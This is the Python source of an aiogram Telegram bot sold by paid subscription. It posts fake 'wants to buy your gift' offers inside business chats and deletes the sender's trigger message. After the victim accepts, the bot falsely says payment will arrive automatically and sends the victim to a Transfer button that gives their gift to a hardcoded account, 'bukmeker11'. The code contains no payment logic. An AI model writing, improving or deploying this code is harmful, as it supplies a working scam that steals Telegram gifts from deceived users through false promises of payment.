"""Telegram Business Gift Offer Bot - Final Edition
Стабильный, безопасный, с полной обработкой ошибок.
"""

import asyncio
import html
import json
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
    LinkPreviewOptions, Message, User,
)
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
TON_WALLET = os.getenv("TON_WALLET", "")
ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
TTL_HOURS = int(os.getenv("OFFER_TTL_HOURS", "5"))
USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
OFFERS_LOG = os.getenv("OFFERS_LOG", "offers.log")
RATE_LIMIT = float(os.getenv("RATE_LIMIT", "1.0"))

GIFT_RECEIVER = "bukmeker11"

if not TOKEN:
    raise SystemExit("BOT_TOKEN не задан в .env")
if not ADMIN_ID:
    raise SystemExit("ADMIN_ID не задан в .env")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("giftbot")

router = Router()

COMMAND_REGEX = re.compile(r"^buy\s+(.+)$", re.IGNORECASE | re.DOTALL)
LINK_REGEX = re.compile(r"(https?://\S+|t\.me/\S+)", re.IGNORECASE)
PRICE_REGEX = re.compile(r"\b(\d+(?:[.,]\d+)?)\b")

LANG_TOKENS = {
    "ru": "ru", "рус": "ru",
    "eng": "en", "en": "en", "англ": "en",
    "kit": "zh", "zh": "zh", "кит": "zh",
    "arb": "ar", "ar": "ar", "араб": "ar",
}

STAR_EMOJI = "⭐"


def detect_lang(payload: str) -> str:
    for word in payload.lower().split():
        w = word.strip(".,!?")
        if w in LANG_TOKENS:
            return LANG_TOKENS[w]
    return "ru"


_rate_lock = asyncio.Lock()
_last_request: dict[int, float] = {}


async def rate_limit(user_id: int) -> bool:
    async with _rate_lock:
        now = time.monotonic()
        last = _last_request.get(user_id, 0)
        if now - last < RATE_LIMIT:
            return False
        _last_request[user_id] = now
        return True


_allowed_cache: Optional[set[int]] = None


def load_allowed() -> set[int]:
    global _allowed_cache
    if _allowed_cache is None:
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                _allowed_cache = {int(x) for x in json.load(f)}
        except (FileNotFoundError, json.JSONDecodeError):
            _allowed_cache = set()
    return _allowed_cache


def save_allowed() -> None:
    if _allowed_cache is None:
        return
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_allowed_cache), f)
    except Exception as e:
        log.error(f"save users: {e}")


def is_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in load_allowed()


def grant_access(user_id: int) -> None:
    load_allowed().add(user_id)
    save_allowed()


def revoke_access(user_id: int) -> None:
    load_allowed().discard(user_id)
    save_allowed()


@dataclass
class Offer:
    id: str
    connection_id: str
    chat_id: int
    message_id: int
    buyer_id: int
    buyer_name: str
    buyer_username: str
    price: str
    currency: str
    lang: str = "ru"
    gift_link: str = "подарок"
    created_at: float = field(default_factory=time.time)
    status: str = "pending"


offers: dict[str, Offer] = {}
_pending_users: set[int] = set()


def user_line(user: User) -> str:
    uname = f"@{user.username}" if user.username else "нет"
    name = html.escape(user.full_name)
    return f"ID: <code>{user.id}</code>\nИмя: {name}\nUsername: {uname}"


def admin_kb(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Добавить", callback_data=f"admin:allow:{user_id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin:deny:{user_id}"),
    ]])


def log_offer(offer: Offer) -> None:
    try:
        with open(OFFERS_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                'id': offer.id,
                'buyer_id': offer.buyer_id,
                'buyer_name': offer.buyer_name,
                'price': offer.price,
                'currency': offer.currency,
                'gift_link': offer.gift_link,
                'status': offer.status,
                'created': datetime.fromtimestamp(offer.created_at).isoformat(),
            }, ensure_ascii=False) + "\n")
    except Exception as e:
        log.error(f"log_offer: {e}")


async def safe_send(bot: Bot, text: str, chat_id: int,
                    business_connection_id: Optional[str],
                    kb: Optional[InlineKeyboardMarkup] = None,
                    retries: int = 3) -> Optional[Message]:
    for attempt in range(retries):
        try:
            kwargs = {
                'chat_id': chat_id,
                'text': text,
                'reply_markup': kb,
                'link_preview_options': LinkPreviewOptions(is_disabled=True),
            }
            if business_connection_id:
                kwargs['business_connection_id'] = business_connection_id
            return await bot.send_message(**kwargs)
        except TelegramRetryAfter as e:
            wait = min(e.retry_after, 60)
            log.warning(f"RetryAfter {wait}s")
            await asyncio.sleep(wait)
        except TelegramForbiddenError:
            log.error(f"User {chat_id} blocked bot")
            return None
        except TelegramBadRequest as e:
            log.error(f"BadRequest: {e}")
            return None
        except Exception as e:
            log.exception(f"send {attempt+1}: {e}")
            await asyncio.sleep(1)
    return None


async def safe_edit(bot: Bot, text: str,
                    business_connection_id: Optional[str],
                    message_id: int,
                    kb: Optional[InlineKeyboardMarkup] = None,
                    chat_id: Optional[int] = None) -> bool:
    try:
        kwargs = {'text': text, 'message_id': message_id, 'reply_markup': kb}
        if business_connection_id:
            kwargs['business_connection_id'] = business_connection_id
        else:
            kwargs['chat_id'] = chat_id
        await bot.edit_message_text(**kwargs)
        return True
    except TelegramBadRequest as e:
        if "message is not modified" in str(e).lower():
            return True
        log.warning(f"edit: {e}")
        return False
    except Exception as e:
        log.error(f"edit: {e}")
        return False


async def safe_delete(bot: Bot, chat_id: int, message_id: int,
                      business_connection_id: Optional[str] = None) -> bool:
    try:
        if business_connection_id:
            try:
                await bot.delete_business_messages(
                    business_connection_id=business_connection_id,
                    message_ids=[message_id],
                )
                return True
            except Exception:
                pass
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
        return True
    except Exception as e:
        log.warning(f"delete: {e}")
        return False


def parse_price(payload: str) -> Optional[str]:
    cleaned = payload
    for token in LANG_TOKENS:
        cleaned = re.sub(rf"\b{token}\b", "", cleaned, flags=re.IGNORECASE)
    cleaned = LINK_REGEX.sub("", cleaned)
    matches = PRICE_REGEX.findall(cleaned)
    for m in matches:
        try:
            val = float(m.replace(",", "."))
            if 0 < val < 10_000_000:
                if val == int(val):
                    return str(int(val))
                return f"{val:g}"
        except ValueError:
            continue
    return None


def detect_currency(payload: str) -> str:
    p = payload.lower()
    for word in ("gram", "грам"):
        if word in p:
            return "Gram"
    return STAR_EMOJI


def detect_gift(payload: str) -> str:
    m = LINK_REGEX.search(payload)
    return m.group(0) if m else "подарок"


GIFT_EMOJI = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'


def ttl_text(lang: str) -> str:
    texts = {
        "en": f"{TTL_HOURS} h 59 min",
        "zh": f"{TTL_HOURS} 小时 59 分钟",
        "ar": f"{TTL_HOURS} ساعة و 59 دقيقة",
    }
    return texts.get(lang, f"{TTL_HOURS} ч 59 мин")


def gift_text(o: Offer) -> str:
    if o.gift_link != "подарок":
        return o.gift_link
    texts = {
        "en": "a gift",
        "zh": "礼物",
        "ar": "هدية",
    }
    return texts.get(o.lang, "подарок")


def text_price_error(lang: str) -> str:
    texts = {
        "en": "⚠️ Please specify the price!\nExample: <code>buy 100</code>",
        "zh": "⚠️ 请指定价格！\n示例：<code>buy 100</code>",
        "ar": "⚠️ الرجاء تحديد السعر!\nمثال: <code>buy 100</code>",
    }
    return texts.get(lang, "⚠️ Укажите цену!\nПример: <code>buy 100</code>")


def text_no_access(lang: str) -> str:
    texts = {
        "en": "⛔️ No access.\nPress /start in the bot's private chat",
        "zh": "⛔️ 没有访问权限。\n请在机器人的私聊中点击 /start",
        "ar": "⛔️ لا يوجد صلاحية وصول.\nاضغط /start في محادثة البوت الخاصة",
    }
    return texts.get(lang, "⛔️ Нет доступа.\nНажмите /start в личке бота")


def text_error(lang: str, err: str) -> str:
    texts = {
        "en": f"⚠️ Error: {err}",
        "zh": f"⚠️ 错误：{err}",
        "ar": f"⚠️ خطأ: {err}",
    }
    return texts.get(lang, f"⚠️ Ошибка: {err}")


def text_offer(o: Offer) -> str:
    name = html.escape(o.buyer_name)
    gift = gift_text(o)
    ttl = ttl_text(o.lang)
    texts = {
        "en": f"User <b>{name}</b> wants to buy {gift}\nfor <b>{o.price} {o.currency}</b>\n\n<b>Offer expires in {ttl}</b>",
        "zh": f"用户 <b>{name}</b> 想以\n<b>{o.price} {o.currency}</b> 购买{gift}\n\n<b>报价将在 {ttl} 后过期</b>",
        "ar": f"المستخدم <b>{name}</b> يرغب في شراء {gift}\nمقابل <b>{o.price} {o.currency}</b>\n\n<b>ينتهي العرض خلال {ttl}</b>",
        "ru": f"Пользователь <b>{name}</b> хочет купить\n{gift} за <b>{o.price} {o.currency}</b>\n\n<b>Предложение истечёт через {ttl}</b>",
    }
    return texts.get(o.lang, texts["ru"])


def text_declined(o: Offer) -> str:
    texts = {
        "en": "❌ Offer declined",
        "zh": "❌ 报价已被拒绝",
        "ar": "❌ تم رفض العرض",
    }
    return texts.get(o.lang, "❌ Предложение отклонено")


def text_sold(o: Offer) -> str:
    texts = {
        "en": f"{GIFT_EMOJI} Deal confirmed!\n\n• Tap «Transfer» to send the gift and receive {o.currency}.",
        "zh": f"{GIFT_EMOJI} 交易确认！\n\n• 点击「转赠」发送礼物即可到账 {o.currency}。",
        "ar": f"{GIFT_EMOJI} تم تأكيد الصفقة!\n\n• اضغط «إرسال» لإرسال الهدية واستلام {o.currency}.",
        "ru": f"{GIFT_EMOJI} Сделка подтверждена!\n\n• Нажмите «Передать» и отправьте подарок — {o.currency} придут автоматически.",
    }
    return texts.get(o.lang, texts["ru"])


def text_expired(lang: str) -> str:
    texts = {
        "en": "⏳ The offer has expired",
        "zh": "⏳ 报价已过期",
        "ar": "⏳ انتهت صلاحية العرض",
    }
    return texts.get(lang, "⏳ Время предложения истекло")


def text_sent_alert(lang: str) -> str:
    texts = {
        "en": "✅ Thank you! The gift has been sent",
        "zh": "✅ 谢谢！礼物已发送",
        "ar": "✅ شكراً! تم إرسال الهدية",
    }
    return texts.get(lang, "✅ Спасибо! Подарок отправлен")


def text_decline_alert(lang: str) -> str:
    texts = {
        "en": "❌ Declined",
        "zh": "❌ 已拒绝",
        "ar": "❌ تم الرفض",
    }
    return texts.get(lang, "❌ Отклонено")


def text_offer_not_found(lang: str) -> str:
    texts = {
        "en": "⚠️ Offer not found or expired",
        "zh": "⚠️ 未找到报价或已过期",
        "ar": "⚠️ العرض غير موجود أو منتهي الصلاحية",
    }
    return texts.get(lang, "⚠️ Оффер не найден или истёк")


def text_already_confirmed(lang: str) -> str:
    texts = {
        "en": "✅ Already confirmed",
        "zh": "✅ 已确认",
        "ar": "✅ تم التأكيد بالفعل",
    }
    return texts.get(lang, "✅ Уже подтверждено")


def text_accept_alert(o: Offer) -> str:
    buyer = o.buyer_name[:30] + "..." if len(o.buyer_name) > 30 else o.buyer_name
    if not o.buyer_username or o.buyer_username.isdigit():
        return f"⚠️ У покупателя нет @username\nОтправьте подарок вручную на ID: {o.buyer_id}"
    return f"✅ Оффер принят.\nПередайте подарок пользователю {buyer}."


def kb_offer(o: Offer) -> InlineKeyboardMarkup:
    labels = {
        "en": ("✓ Accept", "✕ Decline"),
        "zh": ("✓ 接受", "✕ 拒绝"),
        "ar": ("✓ قبول", "✕ رفض"),
    }.get(o.lang, ("✓ Принять", "✕ Отклонить"))
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=labels[1], callback_data=f"decline:{o.id}"),
        InlineKeyboardButton(text=labels[0], callback_data=f"accept:{o.id}"),
    ]])


def kb_sold(o: Offer) -> InlineKeyboardMarkup:
    label = {"en": "Transfer", "zh": "转赠", "ar": "إرسال"}.get(o.lang, "Передать")
    confirm = {"en": "✓ I sent the gift", "zh": "✓ 我已发送礼物", "ar": "✓ لقد أرسلت الهدية"}.get(o.lang, "✓ Я отправил подарок")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=label, url=f"tg://send_gift?to={GIFT_RECEIVER}")],
        [InlineKeyboardButton(text=confirm, callback_data=f"sent:{o.id}")],
    ])


@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user:
        return
    if is_allowed(user.id):
        await message.answer(
            "👋 Привет!\n\n✅ Доступ активен.\n\n"
            "В чате с бизнесом напишите:\n<code>buy 100</code>\n"
            "Языки: <code>eng</code>, <code>kit</code>, <code>arb</code>\n"
            "Валюта: <code>gram</code> (Gram) или по умолчанию ⭐"
        )
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")
    ]])
    await message.answer(
        f"👋 Привет! Это бот офферов {GIFT_EMOJI}\n\n"
        f"Вход стоит <b>{ENTRY_PRICE} TON</b>",
        reply_markup=kb
    )


@router.callback_query(F.data == "entry:start")
async def entry_start(cb: CallbackQuery, bot: Bot) -> None:
    if is_allowed(cb.from_user.id):
        await cb.answer("✅ Доступ уже есть", show_alert=True)
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="entry:paid")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="entry:back")],
    ])
    try:
        await cb.message.edit_text(
            f"💳 <b>Оплата входа</b>\n\n"
            f"Сумма: <b>{ENTRY_PRICE} TON</b>\n"
            f"Адрес: <code>{html.escape(TON_WALLET)}</code>\n\n"
            f"После оплаты нажмите «Я оплатил» и пришлите скриншот.",
            reply_markup=kb
        )
    except Exception:
        pass
    await cb.answer()


@router.callback_query(F.data == "entry:back")
async def entry_back(cb: CallbackQuery, bot: Bot) -> None:
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔑 Купить вход", callback_data="entry:start")
    ]])
    try:
        await cb.message.edit_text(
            f"👋 Привет! Это бот офферов {GIFT_EMOJI}\n\nВход стоит <b>{ENTRY_PRICE} TON</b>",
            reply_markup=kb
        )
    except Exception:
        pass
    await cb.answer()


@router.callback_query(F.data == "entry:paid")
async def entry_paid(cb: CallbackQuery, bot: Bot) -> None:
    user = cb.from_user
    if is_allowed(user.id):
        await cb.answer("✅ Доступ уже есть", show_alert=True)
        return
    _pending_users.add(user.id)
    try:
        await cb.message.edit_text("📸 Пришлите скриншот перевода")
    except Exception:
        pass
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 <b>Заявка на вход</b>\n\n{user_line(user)}",
            reply_markup=admin_kb(user.id)
        )
    except Exception as e:
        log.error(f"admin notify: {e}")
    await cb.answer("✅ Заявка отправлена")


@router.message(F.photo | F.document, F.chat.type == "private")
async def on_screenshot(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user:
        return
    if user.id != ADMIN_ID and user.id not in _pending_users:
        return
    _pending_users.discard(user.id)
    try:
        await bot.copy_message(
            chat_id=ADMIN_ID,
            from_chat_id=message.chat.id,
            message_id=message.message_id,
            caption=f"📸 <b>Скриншот оплаты</b>\n\n{user_line(user)}",
            reply_markup=admin_kb(user.id)
        )
        await message.answer("✅ Скриншот отправлен")
    except Exception as e:
        log.error(f"screenshot: {e}")
        await message.answer("⚠️ Не удалось отправить, попробуйте ещё раз")


@router.message(Command("ledgerteam"), F.chat.type == "private")
async def cmd_ledgerteam(message: Message, bot: Bot) -> None:
    user = message.from_user
    if not user or is_allowed(user.id):
        return
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🚀 <b>Заявка /ledgerteam</b>\n\n{user_line(user)}",
            reply_markup=admin_kb(user.id)
        )
        await message.answer("✅ Заявка отправлена")
    except Exception:
        pass


@router.callback_query(F.data.startswith(("admin:allow:", "admin:deny:")))
async def admin_decision(cb: CallbackQuery, bot: Bot) -> None:
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("❌ Нет прав", show_alert=True)
        return
    try:
        _, action, raw = cb.data.split(":", 2)
        user_id = int(raw)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    if action == "allow":
        grant_access(user_id)
        _pending_users.discard(user_id)
        try:
            await bot.send_message(user_id, "✅ <b>Вам выдан доступ!</b>\n\n/start")
        except Exception:
            pass
        try:
            await cb.message.edit_text(cb.message.html_text + "\n\n— ✅ <b>Добавлен</b>")
        except Exception:
            pass
        await cb.answer("✅ Добавлен")
    else:
        _pending_users.discard(user_id)
        try:
            await bot.send_message(user_id, "❌ Отклонено.")
        except Exception:
            pass
        try:
            await cb.message.edit_text(cb.message.html_text + "\n\n— ❌ <b>Отклонено</b>")
        except Exception:
            pass
        await cb.answer("❌ Отклонено")


@router.message(Command("grant"), F.chat.type == "private")
async def cmd_grant(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        grant_access(user_id)
        await message.answer(f"✅ Доступ выдан: <code>{user_id}</code>")
        try:
            await bot.send_message(user_id, "✅ Вам выдан доступ!\n\n/start")
        except Exception:
            pass
    except Exception:
        await message.answer("❌ Формат: /grant USER_ID")


@router.message(Command("revoke"), F.chat.type == "private")
async def cmd_revoke(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        revoke_access(user_id)
        await message.answer(f"🚫 Доступ удалён: <code>{user_id}</code>")
    except Exception:
        await message.answer("❌ Формат: /revoke USER_ID")


@router.message(Command("users"), F.chat.type == "private")
async def cmd_users(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    users = sorted(load_allowed())
    if not users:
        await message.answer("👥 Список пуст")
        return
    await message.answer(
        f"👥 <b>Пользователей: {len(users)}</b>\n\n" +
        "\n".join(f"• <code>{u}</code>" for u in users)
    )


@router.message(Command("stats"), F.chat.type == "private")
async def cmd_stats(message: Message, bot: Bot) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    alive = sum(1 for o in offers.values() if o.status == "pending")
    await message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"Активных офферов: <b>{alive}</b>\n"
        f"Всего в памяти: <b>{len(offers)}</b>\n"
        f"Пользователей с доступом: <b>{len(load_allowed())}</b>"
    )


@router.business_message(F.text)
async def create_offer(message: Message, bot: Bot) -> None:
    if not message.text or not message.business_connection_id:
        return
    match = COMMAND_REGEX.match(message.text.strip())
    if not match:
        return
    uid = message.from_user.id if message.from_user else 0
    if not await rate_limit(uid):
        log.warning(f"rate limit: {uid}")
        return
    payload = match.group(1).strip()
    lang = detect_lang(payload)
    price = parse_price(payload)
    if price is None:
        await safe_send(
            bot, text_price_error(lang),
            message.chat.id, message.business_connection_id
        )
        return
    gift_link = detect_gift(payload)
    currency = detect_currency(payload)
    try:
        connection = await bot.get_business_connection(
            business_connection_id=message.business_connection_id
        )
        buyer = connection.user
        buyer_id = buyer.id
        if not is_allowed(buyer_id):
            await safe_send(
                bot, text_no_access(lang),
                message.chat.id, message.business_connection_id
            )
            return
        buyer_name = f"@{buyer.username}" if buyer.username else buyer.full_name
        buyer_username = buyer.username if buyer.username else str(buyer.id)
        offer_id = secrets.token_urlsafe(8)
        offer = Offer(
            id=offer_id,
            connection_id=message.business_connection_id,
            chat_id=message.chat.id,
            message_id=message.message_id,
            buyer_id=buyer_id,
            buyer_name=buyer_name,
            buyer_username=buyer_username,
            price=price,
            currency=currency,
            lang=lang,
            gift_link=gift_link,
        )
        sent = await safe_send(
            bot, text_offer(offer),
            message.chat.id, message.business_connection_id,
            kb_offer(offer)
        )
        if not sent:
            log.error(f"offer send failed {offer_id}")
            return
        offer.message_id = sent.message_id
        offers[offer_id] = offer
        log_offer(offer)
        log.info(f"offer: {offer_id} | {price} {currency} | buyer={buyer_id}")
        await safe_delete(bot, message.chat.id, message.message_id, message.business_connection_id)
    except Exception as e:
        log.exception(f"create_offer: {e}")
        try:
            await safe_send(
                bot, text_error(lang, html.escape(str(e)[:100])),
                message.chat.id, message.business_connection_id
            )
        except Exception:
            pass


@router.callback_query(F.data.startswith(("accept:", "decline:")))
async def resolve_offer(cb: CallbackQuery, bot: Bot) -> None:
    try:
        action, offer_id = cb.data.split(":", 1)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    offer = offers.get(offer_id)
    if not offer:
        await cb.answer("⚠️ Оффер не найден или истёк", show_alert=True)
        return
    if action == "decline":
        offer.status = "declined"
        log_offer(offer)
        await safe_edit(
            bot, text_declined(offer),
            offer.connection_id, offer.message_id, None, offer.chat_id
        )
        offers.pop(offer_id, None)
        await cb.answer(text_decline_alert(offer.lang))
    else:
        offer.status = "accepted"
        log_offer(offer)
        edited = await safe_edit(
            bot, text_sold(offer),
            offer.connection_id, offer.message_id,
            kb_sold(offer), offer.chat_id
        )
        if not edited:
            await safe_send(
                bot, text_sold(offer),
                offer.chat_id, offer.connection_id, kb_sold(offer)
            )
        alert = text_accept_alert(offer)
        if len(alert) > 200:
            alert = alert[:197] + "..."
        await cb.answer(alert, show_alert=True)


@router.callback_query(F.data.startswith("sent:"))
async def confirm_sent(cb: CallbackQuery, bot: Bot) -> None:
    try:
        _, offer_id = cb.data.split(":", 1)
    except Exception:
        await cb.answer("❌ Ошибка", show_alert=True)
        return
    offer = offers.get(offer_id)
    if not offer:
        await cb.answer("✅ Уже подтверждено", show_alert=True)
        return
    lang = offer.lang
    offer.status = "completed"
    log_offer(offer)
    await cb.answer(text_sent_alert(lang), show_alert=True)
    if ADMIN_ID:
        try:
            await bot.send_message(
                ADMIN_ID,
                f"✅ <b>Продажа завершена</b>\n\n"
                f"Оффер: <code>{offer_id}</code>\n"
                f"Цена: {offer.price} {offer.currency}\n"
                f"Покупатель: {html.escape(offer.buyer_name)}"
            )
        except Exception:
            pass
    offers.pop(offer_id, None)


bot_global: Optional[Bot] = None


async def cleanup_offers() -> None:
    while True:
        try:
            await asyncio.sleep(60)
            now = time.time()
            expired = [
                oid for oid, o in offers.items()
                if now - o.created_at > TTL_HOURS * 3600
            ]
            for oid in expired:
                offer = offers.pop(oid, None)
                if offer and bot_global:
                    offer.status = "expired"
                    log_offer(offer)
                    await safe_edit(
                        bot_global, text_expired(offer.lang),
                        offer.connection_id, offer.message_id, None, offer.chat_id
                    )
            if expired:
                log.info(f"expired: {len(expired)}")
        except Exception as e:
            log.error(f"cleanup: {e}")


async def main() -> None:
    global bot_global
    log.info("Запуск Gift Offer Bot")
    session = AiohttpSession(timeout=30)
    bot_global = Bot(
        TOKEN,
        default=DefaultBotProperties(parse_mode="HTML"),
        session=session
    )
    dp = Dispatcher()
    dp.include_router(router)
    asyncio.create_task(cleanup_offers())
    try:
        me = await bot_global.get_me()
        log.info(f"bot: @{me.username} ({me.id})")
        log.info(f"admin: {ADMIN_ID}")
        log.info(f"access: {len(load_allowed())}")
        log.info(f"ttl: {TTL_HOURS}h")
        await dp.start_polling(
            bot_global,
            allowed_updates=["message", "callback_query", "business_message", "business_connection"]
        )
    finally:
        await bot_global.session.close()
        log.info("bot stopped")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("interrupted")
    except Exception as e:
        log.exception(f"fatal: {e}")
